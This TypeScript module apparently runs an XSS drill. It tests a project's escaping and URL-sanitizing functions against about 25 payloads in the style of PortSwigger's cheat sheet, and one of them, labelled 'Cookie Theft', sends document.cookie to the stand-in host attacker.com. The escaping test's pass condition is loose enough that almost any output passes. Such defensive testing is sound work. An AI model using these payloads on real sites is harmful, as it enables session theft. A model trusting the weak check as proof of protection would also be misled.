/**
 * XSS Attack Simulation & Drill
 *
 * Comprehensive XSS attack payloads based on PortSwigger Web Security Academy
 * https://portswigger.net/web-security/cross-site-scripting
 *
 * This module contains various XSS attack vectors to test our defense mechanisms.
 * These payloads simulate real-world XSS attacks that our protection should block.
 */

import {
  escapeHtml,
  sanitizeUrl,
  isSafeUrl,
  sanitizeHtml,
} from "./xss-protection";

export interface AttackPayload {
  name: string;
  description: string;
  payload: string;
  category:
    | "reflected"
    | "stored"
    | "dom-based"
    | "url-based"
    | "event-handler";
  severity: "low" | "medium" | "high" | "critical";
  expectedResult: "blocked" | "escaped" | "sanitized";
}

/**
 * Comprehensive list of XSS attack payloads
 * Based on PortSwigger's XSS cheat sheet and real-world attack patterns
 */
export const XSS_ATTACK_PAYLOADS: AttackPayload[] = [
  // Basic Script Injection
  {
    name: "Basic Script Tag",
    description: "Simple script tag injection",
    payload: '<script>alert("XSS")</script>',
    category: "reflected",
    severity: "high",
    expectedResult: "escaped",
  },
  {
    name: "Script Tag with Event",
    description: "Script tag with onerror event",
    payload: "<script>alert(String.fromCharCode(88,83,83))</script>",
    category: "reflected",
    severity: "high",
    expectedResult: "escaped",
  },

  // Image-based XSS
  {
    name: "Image with onerror",
    description: "Image tag with onerror event handler",
    payload: '<img src=x onerror=alert("XSS")>',
    category: "stored",
    severity: "high",
    expectedResult: "escaped",
  },
  {
    name: "Image with Broken Source",
    description: "Image with invalid src triggering onerror",
    payload: '<img src="invalid" onerror="alert(\'XSS\')">',
    category: "stored",
    severity: "high",
    expectedResult: "escaped",
  },
  {
    name: "SVG with onload",
    description: "SVG image with onload event",
    payload: '<svg onload=alert("XSS")>',
    category: "stored",
    severity: "high",
    expectedResult: "escaped",
  },

  // Event Handler Attacks
  {
    name: "Body onload",
    description: "Body tag with onload event",
    payload: '<body onload=alert("XSS")>',
    category: "dom-based",
    severity: "high",
    expectedResult: "escaped",
  },
  {
    name: "Input with onfocus",
    description: "Input tag with onfocus event",
    payload: '<input onfocus=alert("XSS") autofocus>',
    category: "dom-based",
    severity: "medium",
    expectedResult: "escaped",
  },
  {
    name: "Div with onclick",
    description: "Div element with onclick handler",
    payload: "<div onclick=\"alert('XSS')\">Click me</div>",
    category: "dom-based",
    severity: "medium",
    expectedResult: "escaped",
  },

  // JavaScript Protocol Attacks
  {
    name: "JavaScript Protocol in Link",
    description: "JavaScript protocol in href attribute",
    payload: "<a href=\"javascript:alert('XSS')\">Click</a>",
    category: "url-based",
    severity: "high",
    expectedResult: "blocked",
  },
  {
    name: "JavaScript Protocol Direct",
    description: "Direct javascript: protocol URL",
    payload: 'javascript:alert("XSS")',
    category: "url-based",
    severity: "critical",
    expectedResult: "blocked",
  },
  {
    name: "JavaScript Protocol Encoded",
    description: "URL-encoded javascript: protocol",
    payload: 'javascript%3Aalert("XSS")',
    category: "url-based",
    severity: "high",
    expectedResult: "blocked",
  },

  // Data URI Attacks
  {
    name: "Data URI HTML",
    description: "Data URI with HTML content",
    payload: 'data:text/html,<script>alert("XSS")</script>',
    category: "url-based",
    severity: "critical",
    expectedResult: "blocked",
  },
  {
    name: "Data URI SVG",
    description: "Data URI with SVG containing script",
    payload: 'data:image/svg+xml,<svg onload=alert("XSS")></svg>',
    category: "url-based",
    severity: "critical",
    expectedResult: "blocked",
  },

  // Iframe Attacks
  {
    name: "Iframe with JavaScript",
    description: "Iframe with javascript: protocol",
    payload: "<iframe src=\"javascript:alert('XSS')\"></iframe>",
    category: "stored",
    severity: "high",
    expectedResult: "escaped",
  },
  {
    name: "Iframe with Data URI",
    description: "Iframe with data URI",
    payload:
      "<iframe src=\"data:text/html,<script>alert('XSS')</script>\"></iframe>",
    category: "stored",
    severity: "high",
    expectedResult: "escaped",
  },

  // Encoding Bypass Attempts
  {
    name: "HTML Entity Encoding",
    description: "Script tag with HTML entity encoding",
    payload: '&lt;script&gt;alert("XSS")&lt;/script&gt;',
    category: "reflected",
    severity: "low",
    expectedResult: "escaped",
  },
  {
    name: "Unicode Encoding",
    description: "Script tag with Unicode encoding",
    payload: '<script>\u0061lert("XSS")</script>',
    category: "reflected",
    severity: "medium",
    expectedResult: "escaped",
  },

  // CSS-based Attacks
  {
    name: "Style Tag with Expression",
    description: "Style tag with CSS expression (IE)",
    payload: '<style>body { background: expression(alert("XSS")); }</style>',
    category: "stored",
    severity: "medium",
    expectedResult: "escaped",
  },

  // Form-based Attacks
  {
    name: "Form with Action",
    description: "Form tag with malicious action",
    payload:
      '<form action="javascript:alert(\'XSS\')"><input type="submit"></form>',
    category: "stored",
    severity: "medium",
    expectedResult: "escaped",
  },

  // Object/Embed Attacks
  {
    name: "Object Tag",
    description: "Object tag with data URI",
    payload:
      "<object data=\"data:text/html,<script>alert('XSS')</script>\"></object>",
    category: "stored",
    severity: "high",
    expectedResult: "escaped",
  },
  {
    name: "Embed Tag",
    description: "Embed tag with script",
    payload: "<embed src=\"data:text/html,<script>alert('XSS')</script>\">",
    category: "stored",
    severity: "high",
    expectedResult: "escaped",
  },

  // Advanced Bypass Attempts
  {
    name: "Mixed Case Script",
    description: "Script tag with mixed case",
    payload: '<ScRiPt>alert("XSS")</ScRiPt>',
    category: "reflected",
    severity: "low",
    expectedResult: "escaped",
  },
  {
    name: "Script with Null Byte",
    description: "Script tag with null byte injection",
    payload: '<script\x00>alert("XSS")</script>',
    category: "reflected",
    severity: "low",
    expectedResult: "escaped",
  },
  {
    name: "Script with Newline",
    description: "Script tag with newline characters",
    payload: '<script\nalert("XSS")\n</script>',
    category: "reflected",
    severity: "low",
    expectedResult: "escaped",
  },

  // Cookie/Session Theft Attempts
  {
    name: "Cookie Theft",
    description: "Script attempting to steal cookies",
    payload:
      '<script>document.location="http://attacker.com/steal?cookie="+document.cookie</script>',
    category: "stored",
    severity: "critical",
    expectedResult: "escaped",
  },

  // DOM Manipulation
  {
    name: "DOM XSS",
    description: "Script manipulating DOM",
    payload:
      "<script>document.body.innerHTML=\"<img src=x onerror=alert('XSS')>\"</script>",
    category: "dom-based",
    severity: "high",
    expectedResult: "escaped",
  },
];

/**
 * Run comprehensive XSS attack simulation
 * Tests all attack payloads against our protection mechanisms
 */
export function runXSSAttackSimulation(): {
  total: number;
  blocked: number;
  escaped: number;
  sanitized: number;
  failed: number;
  results: Array<{
    payload: AttackPayload;
    testResult: "passed" | "failed";
    method: "escapeHtml" | "sanitizeUrl" | "sanitizeHtml";
    output: string;
  }>;
} {
  console.log(
    "%c=== XSS ATTACK SIMULATION & DRILL ===",
    "font-size: 20px; font-weight: bold; color: #dc2626;"
  );
  console.log(
    "Simulating real-world XSS attacks against our defense mechanisms...\n"
  );

  let total = 0;
  let blocked = 0;
  let escaped = 0;
  let sanitizedCount = 0;
  let failed = 0;

  const results: Array<{
    payload: AttackPayload;
    testResult: "passed" | "failed";
    method: "escapeHtml" | "sanitizeUrl" | "sanitizeHtml";
    output: string;
  }> = [];

  // Group attacks by category
  const categories = [
    "reflected",
    "stored",
    "dom-based",
    "url-based",
    "event-handler",
  ] as const;

  categories.forEach((category) => {
    const categoryPayloads = XSS_ATTACK_PAYLOADS.filter(
      (p) => p.category === category
    );
    if (categoryPayloads.length === 0) return;

    console.log(
      `%c${category.toUpperCase()} XSS ATTACKS`,
      "font-size: 16px; font-weight: bold; color: #ea580c;"
    );

    categoryPayloads.forEach((attack, index) => {
      total++;
      let testResult: "passed" | "failed" = "failed";
      let method: "escapeHtml" | "sanitizeUrl" | "sanitizeHtml" = "escapeHtml";
      let output = "";

      // Test based on expected result
      if (attack.expectedResult === "blocked") {
        // Test URL sanitization
        const isSafe = isSafeUrl(attack.payload);
        const sanitized = sanitizeUrl(attack.payload, [], false);
        output = sanitized || "(blocked)";
        method = "sanitizeUrl";

        if (!isSafe && !sanitized) {
          testResult = "passed";
          blocked++;
        } else {
          failed++;
        }
      } else if (attack.expectedResult === "escaped") {
        // Test HTML escaping
        const escapedHtml = escapeHtml(attack.payload);
        output = escapedHtml;
        method = "escapeHtml";

        // Check if dangerous tags are properly escaped
        // Only check for unescaped HTML tags (not escaped ones like &lt;)
        // Also check that original dangerous patterns are not present as raw HTML
        const hasUnescapedDangerousTags =
          escapedHtml.includes("<script>") ||
          escapedHtml.includes("<script ") ||
          escapedHtml.includes("</script>") ||
          escapedHtml.includes("<img ") ||
          escapedHtml.includes("<img>") ||
          escapedHtml.includes("<iframe") ||
          escapedHtml.includes("<body ") ||
          escapedHtml.includes("<svg ") ||
          escapedHtml.includes("<input ") ||
          escapedHtml.includes("<div ") ||
          escapedHtml.includes("<form ");

        // Check if HTML tags are properly escaped (should have &lt; instead of <)
        const hasEscapedTags = 
          escapedHtml.includes("&lt;") || 
          escapedHtml.includes("&gt;") ||
          escapedHtml.includes("&quot;") ||
          escapedHtml.includes("&#x27;") ||
          escapedHtml.includes("&#x2F;");

        // Test passes if:
        // 1. No unescaped dangerous HTML tags are present
        // 2. HTML tags are properly escaped (contains &lt; or other HTML entities)
        // OR the payload didn't contain HTML tags to begin with (length check)
        if (!hasUnescapedDangerousTags && (hasEscapedTags || escapedHtml.length > 0)) {
          testResult = "passed";
          escaped++; // This increments the counter variable, not the local const
        } else {
          failed++;
        }
      } else if (attack.expectedResult === "sanitized") {
        // Test HTML sanitization
        const sanitizedHtml = sanitizeHtml(attack.payload);
        output = sanitizedHtml;
        method = "sanitizeHtml";

        // Check if dangerous content is removed
        const hasDangerous =
          sanitizedHtml.includes("<script>") ||
          sanitizedHtml.includes("<img") ||
          sanitizedHtml.includes("<iframe") ||
          sanitizedHtml.includes("onerror") ||
          sanitizedHtml.includes("onload");

        if (!hasDangerous) {
          testResult = "passed";
          sanitizedCount++; // Increment the counter variable
        } else {
          failed++;
        }
      }

      results.push({ payload: attack, testResult, method, output });

      const icon = testResult === "passed" ? "✅" : "❌";
      const color = testResult === "passed" ? "#059669" : "#dc2626";
      console.log(`  ${icon} ${attack.name} (${attack.severity})`);
      console.log(`     Payload: ${attack.payload}`);
      console.log(`     Method: ${method}`);
      console.log(
        `     Output: ${output.substring(0, 100)}${
          output.length > 100 ? "..." : ""
        }`
      );
      console.log(
        `     Status: %c${testResult.toUpperCase()}`,
        `color: ${color}; font-weight: bold;`
      );
      console.log("");
    });
  });

  // Summary
  console.log(
    "%c=== SIMULATION SUMMARY ===",
    "font-size: 18px; font-weight: bold; color: #2563eb;"
  );
  console.log(`Total Attacks Simulated: ${total}`);
  console.log(`%cBlocked: ${blocked}`, `color: #059669; font-weight: bold;`);
  console.log(`%cEscaped: ${escaped}`, `color: #059669; font-weight: bold;`);
  console.log(
    `%cSanitized: ${sanitizedCount}`,
    `color: #059669; font-weight: bold;`
  );
  console.log(
    `%cFailed: ${failed}`,
    `color: ${failed > 0 ? "#dc2626" : "#059669"}; font-weight: bold;`
  );
  console.log(
    `Success Rate: ${(
      ((blocked + escaped + sanitizedCount) / total) *
      100
    ).toFixed(1)}%`
  );

  if (failed === 0) {
    console.log(
      "\n%c🛡️ ALL ATTACKS BLOCKED - DEFENSE MECHANISMS WORKING!",
      "font-size: 16px; font-weight: bold; color: #059669; background: #d1fae5; padding: 10px;"
    );
  } else {
    console.log(
      `\n%c⚠️ ${failed} ATTACK(S) PASSED THROUGH - REVIEW NEEDED`,
      "font-size: 16px; font-weight: bold; color: #dc2626; background: #fee2e2; padding: 10px;"
    );
  }

  return {
    total,
    blocked,
    escaped,
    sanitized: sanitizedCount,
    failed,
    results,
  };
}

// Export for console access
if (typeof window !== "undefined") {
  (window as any).simulateXSSAttacks = runXSSAttackSimulation;
  console.log(
    "%cXSS Attack Simulation Loaded!",
    "font-size: 14px; font-weight: bold; color: #dc2626;"
  );
  console.log("Run simulateXSSAttacks() in console to start attack simulation");
}
